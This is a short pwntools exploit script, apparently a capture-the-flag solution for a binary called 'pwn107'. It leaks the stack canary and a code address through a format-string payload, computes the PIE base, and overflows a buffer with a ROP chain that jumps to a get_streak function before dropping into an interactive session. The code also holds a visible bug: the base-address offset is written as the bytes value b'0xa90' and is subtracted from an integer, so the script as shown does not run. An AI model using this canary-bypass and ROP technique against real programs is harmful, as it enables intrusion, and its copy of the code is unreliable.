'''
$input = 6$
Address of init is in 9$
Canary is at 13$ 

Leaking in at init + Canary 
%9$lX.%13$lX
'''

from pwn import *

context.binary = binary = ELF("./pwn107.pwn107")
p = process()
#p = remote('10.10.10.10', 9007)
p.recvuntil(b"streak?")
#static_libc_csu_address = binary.symbols.__libc_csu_init
static_libc_csu_address = b"0xa90"

payload = b'%9$lX.%13$lX'
p.sendline(payload)

p.recvuntil(b"streak:")

output = p.recv().split(b"\n")[0]
dynamic_init_libc = int(output.split(b".")[0].strip(), 16)
canary = int(output.split(b".")[1].strip(), 16)

print("csu_init_adress is {}\n canary is {} ".format(hex(dynamic_init_libc),  hex(canary)))

dynamic_base_address = dynamic_init_libc - static_libc_csu_address
binary.address = dynamic_base_address

dynamic_get_streak = binary.symbols.get_streak
rop = ROP(binary)
ret_gadget = rop.find_gadget(['ret'])[0]
payload = b"A"*0x18 + p64(canary) + b"B"*8 + p64(ret_gadget) + p64(dynamic_get_streak)
p.sendline(payload)
p.interactive()
